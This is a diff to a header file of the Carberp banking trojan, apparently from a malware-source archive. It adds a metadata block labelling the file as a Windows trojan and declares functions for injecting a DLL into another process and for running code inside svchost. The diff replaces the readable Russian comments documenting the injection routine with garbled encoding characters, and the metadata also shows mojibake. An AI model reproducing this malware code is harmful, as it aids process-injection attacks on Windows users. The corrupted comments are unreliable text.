@@ -1,3 +1,14 @@
+/*
+  name      Carberp
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 DWORD GetImageBase();
@@ -27,12 +38,12 @@ bool JmpToSvchostSelf( DWORD (WINAPI f_Main)(LPVOID) );
 
 
 //
-//	Инжектирует длл в процесс.
-//	pDll		-	указатель на данные длл
-//	RunRoutine	-	имя експортируемой процедуры которою нужно выполнить.
-//		прототип:	VOID WINAPI Routine(PVOID Param); 
-//	Param		-	параметр, который получит 	RunRoutine
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//	pDll		-	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+//	RunRoutine	-	пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ:	VOID WINAPI Routine(PVOID Param); 
+//	Param		-	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 	RunRoutine
 //
-//	Bозвращает  -   адрес загрузки длл
+//	BпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  -   пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 //	
 PVOID InjectRemouteDll(HANDLE hProcess,PVOID pDll,DWORD size,PCHAR RunRoutine,PVOID Param);
